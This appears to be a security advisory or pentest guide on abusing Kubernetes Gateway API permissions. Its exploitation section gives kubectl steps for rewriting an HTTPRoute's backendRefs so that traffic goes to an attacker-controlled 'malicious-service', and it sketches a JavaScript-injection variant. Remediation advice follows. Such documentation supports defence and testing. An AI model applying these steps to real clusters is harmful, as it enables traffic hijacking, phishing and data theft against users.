# Kubernetes Gateway API Resource Manipulation Vulnerability

## 1. Overview

This document describes a vulnerability related to the manipulation of Kubernetes Gateway API resources. An attacker with sufficient permissions, either directly or indirectly through compromised service accounts or misconfigured RBAC, can modify Gateway, HTTPRoute, and other associated resources to redirect traffic, inject malicious content, or deny service.

### Attack Vector Description

The attack vector involves gaining unauthorized access to modify Gateway API resources. This can be achieved through:

*   **Direct API Access:**  Exploiting weak RBAC configurations to directly manipulate Gateway API objects using `kubectl` or the Kubernetes API.
*   **Compromised Service Accounts:** Leveraging compromised service accounts with excessive permissions to modify Gateway API resources.
*   **Gateway Controller Vulnerabilities:**  Exploiting vulnerabilities within the Gateway API controller itself that allow for unauthorized modification of Gateway resources. This could involve exploiting flaws in the controller's input validation or authorization logic.
*   **CI/CD Pipeline Compromise:**  Compromising the CI/CD pipeline responsible for deploying Gateway API configurations.

Once access is gained, an attacker can modify resources to redirect traffic, inject malicious content, or disrupt service.

### Potential Impact and Consequences

*   **Traffic Redirection:**  Redirecting legitimate user traffic to malicious websites for phishing or malware distribution.
*   **Content Injection:**  Injecting malicious content (e.g., JavaScript) into responses served by applications behind the Gateway, leading to cross-site scripting (XSS) attacks.
*   **Denial of Service (DoS):**  Disrupting service availability by misconfiguring routing rules, overloading backend services, or causing the Gateway controller to crash.
*   **Information Disclosure:**  Exposing sensitive data by improperly configuring TLS settings or routing rules.
*   **Lateral Movement:**  Using the compromised Gateway as a stepping stone to access other services and resources within the Kubernetes cluster.

### Risk Level Assessment

**Critical**

The ability to manipulate Gateway API resources grants significant control over ingress traffic, potentially leading to severe consequences, including data breaches, service disruption, and complete system compromise.

### Technical Explanation

The vulnerability exists due to:

*   **Weak RBAC Configurations:**  Granting excessive permissions to users, groups, or service accounts, allowing them to modify Gateway API resources without proper authorization.
*   **Insecure Defaults:**  Default Gateway API configurations that are overly permissive or lack appropriate security controls.
*   **Gateway Controller Vulnerabilities:**  Bugs or vulnerabilities in the Gateway API controller implementation that allow for unauthorized resource manipulation.
*   **Lack of Monitoring and Auditing:** Insufficient monitoring and auditing of Gateway API resource changes, making it difficult to detect and respond to malicious activity.

### Prerequisites and Conditions Needed

*   **Kubernetes Cluster with Gateway API Installed:**  A Kubernetes cluster with the Gateway API Custom Resource Definitions (CRDs) installed and a compatible Gateway controller deployed.
*   **Sufficient Permissions:**  The attacker must have the necessary permissions to view, create, or modify Gateway API resources (Gateways, HTTPRoutes, etc.).  This could be achieved through compromised credentials or misconfigured RBAC rules.
*   **Network Connectivity:** Network connectivity to the Kubernetes API server.

## 2. Validation and Exploitation Steps

This section outlines the steps required to validate the vulnerability and exploit it.  We'll assume the attacker has already gained some level of access to the cluster and is trying to escalate privileges by manipulating Gateway API resources.  This example will focus on redirecting traffic.

**Phase 1: Validation - Discovering Gateway API Resources and Permissions**

```bash
# 1. Check if the Gateway API CRDs are installed.
kubectl api-resources | grep gateway.networking.k8s.io

# Explanation: This command lists all API resources known to the cluster. We grep for "gateway.networking.k8s.io" to confirm the Gateway API CRDs are present.
# Expected Output: A list of Gateway API resources like "gateways.gateway.networking.k8s.io" will be shown, indicating that the Gateway API is installed.
# Why: To verify the existence of Gateway API and its associated resources within the cluster.  Without these, the vulnerability doesn't exist.

```

```bash
# 2. List all Gateway resources in the default namespace.
kubectl get gateways -n default

# Explanation: This command lists all Gateway resources in the "default" namespace.
# Expected Output:  A list of Gateway resources (e.g., "my-gateway") or an error indicating the user does not have permission.
# Why: To discover available Gateway resources that might be manipulated. The presence of Gateways is a necessary condition for this vulnerability.  If there are none, the tester needs to create one or identify a different target namespace.

```

```bash
# 3. Describe a specific Gateway resource to understand its configuration.
kubectl describe gateway my-gateway -n default

# Explanation: This command displays detailed information about the "my-gateway" Gateway resource.
# Expected Output: YAML configuration of the Gateway, including listeners, addresses, and other settings.  Pay attention to the "listeners" section, as this is where traffic is routed.
# Why: To understand the Gateway's configuration, including the services it exposes and the routing rules that are in place.  This is essential for planning the attack.

```

```bash
# 4. Identify related HTTPRoute resources associated with the Gateway.
kubectl get httproute --all-namespaces

# Explanation: This command lists all HTTPRoute resources across all namespaces.
# Expected Output: A list of HTTPRoute resources and their namespaces.  Note the HTTPRoutes that are associated with the target Gateway.
# Why: HTTPRoutes define the actual routing rules. By manipulating these routes, an attacker can redirect traffic.

```

```bash
# 5. Check RBAC permissions for the current user or service account.
kubectl auth can-i get gateways
kubectl auth can-i edit gateways

# Explanation: These commands check if the current user or service account has permission to "get" and "edit" Gateway resources.
# Expected Output: "yes" or "no" for each command.
# Why: To determine if the current user or service account has the necessary permissions to exploit the vulnerability. A "yes" for "edit" indicates a vulnerability.

```

**Phase 2: Exploitation - Redirecting Traffic**

Let's assume the attacker has found an HTTPRoute named `my-httproute` in the `default` namespace that is associated with the `my-gateway` Gateway, and they have `edit` permissions on HTTPRoutes.

```bash
# 6. Get the YAML definition of the target HTTPRoute.
kubectl get httproute my-httproute -n default -o yaml > my-httproute.yaml

# Explanation: This command retrieves the YAML definition of the "my-httproute" HTTPRoute and saves it to a file named "my-httproute.yaml".
# Expected Output: The HTTPRoute's YAML definition is saved to the specified file.
# Why: To examine the HTTPRoute's configuration and prepare for modification.

```

```bash
# 7. Modify the YAML file (my-httproute.yaml) to redirect traffic to a malicious service.
#
# Example: Suppose the original HTTPRoute looks like this:
#
# apiVersion: gateway.networking.k8s.io/v1beta1
# kind: HTTPRoute
# metadata:
#   name: my-httproute
# spec:
#   rules:
#   - matches:
#     - path:
#         type: PathPrefix
#         value: /
#     backendRefs:
#     - name: my-service
#       port: 80

# Modify it to redirect to a malicious service called "malicious-service":
#
# apiVersion: gateway.networking.k8s.io/v1beta1
# kind: HTTPRoute
# metadata:
#   name: my-httproute
# spec:
#   rules:
#   - matches:
#     - path:
#         type: PathPrefix
#         value: /
#     backendRefs:
#     - name: malicious-service
#       port: 80

# Explanation: This step involves manually editing the "my-httproute.yaml" file. The key modification is to change the `backendRefs` to point to a malicious service or endpoint controlled by the attacker.  In this example, all traffic will now be sent to a service named "malicious-service."  You may also want to change the hostnames or other matchers.
# Expected Output: The modified YAML file with the altered routing rules.
# Why: To redirect traffic to a controlled service, enabling malicious activities.  This is the core of the exploitation. Ensure the service "malicious-service" exists and is serving malicious content or is logging sensitive information.

```

```bash
# 8. Apply the modified HTTPRoute definition.
kubectl apply -f my-httproute.yaml -n default

# Explanation: This command applies the modified HTTPRoute definition to the cluster, updating the routing rules.
# Expected Output: Confirmation message indicating that the HTTPRoute has been updated.
# Why: To activate the new routing rules, effectively redirecting traffic.

```

```bash
# 9. Verify the redirection.  Access the application via the Gateway and confirm that traffic is being redirected to the malicious service.
#
# This step requires accessing the service through the Gateway's external IP or hostname.  You may need to set up port forwarding or use a tool like `curl` to test the redirection.
#
# Example:
# curl -H "Host: example.com" http://<Gateway-External-IP>

# Explanation: Access the application through the Gateway.  Inspect the response to confirm that the traffic is being redirected to the "malicious-service".  For example, if the "malicious-service" serves a different page or logs the request, the redirection is successful.
# Expected Output: The response from the "malicious-service" instead of the original service.
# Why: To confirm that the traffic redirection is successful.

```

**Alternative Exploitation - Content Injection (More Complex)**

Instead of redirecting traffic completely, you could manipulate the HTTPRoute to inject content by creating a new service that acts as a "middleware".  This middleware service would receive the traffic, inject malicious JavaScript into the response, and then forward the modified response to the original service.  This approach is more subtle and can be harder to detect. It would involve modifying the HTTPRoute to direct a portion of the traffic to the middleware service and using the middleware service to modify the HTTP response.

**Remediation Recommendations:**

*   **Principle of Least Privilege:** Implement strict RBAC policies, granting only the minimum necessary permissions to users, groups, and service accounts.
*   **Regular RBAC Audits:**  Regularly review and audit RBAC configurations to identify and correct overly permissive access controls.
*   **Gateway API Policy Enforcement:** Implement policies that restrict the types of modifications that can be made to Gateway API resources.  Tools like Open Policy Agent (OPA) can be used to enforce these policies.
*   **Input Validation:**  Ensure that the Gateway controller performs proper input validation to prevent malicious configuration changes.
*   **Monitoring and Auditing:**  Implement comprehensive monitoring and auditing of Gateway API resource changes to detect and respond to suspicious activity. Monitor the creation, modification, and deletion of Gateway, HTTPRoute, and other related resources.
*   **Gateway Controller Security:**  Keep the Gateway controller software up to date with the latest security patches.
*   **Secure CI/CD Pipelines:** Secure the CI/CD pipelines responsible for deploying Gateway API configurations.
*   **Implement Network Policies:** Use network policies to restrict traffic flow between services and namespaces, limiting the impact of a compromised Gateway.
*   **Consider using a Service Mesh:**  Implement a service mesh for fine-grained traffic management, security, and observability.
*   **Penetration Testing:** Conduct regular penetration testing to identify and remediate vulnerabilities in the Kubernetes environment, including Gateway API configurations.
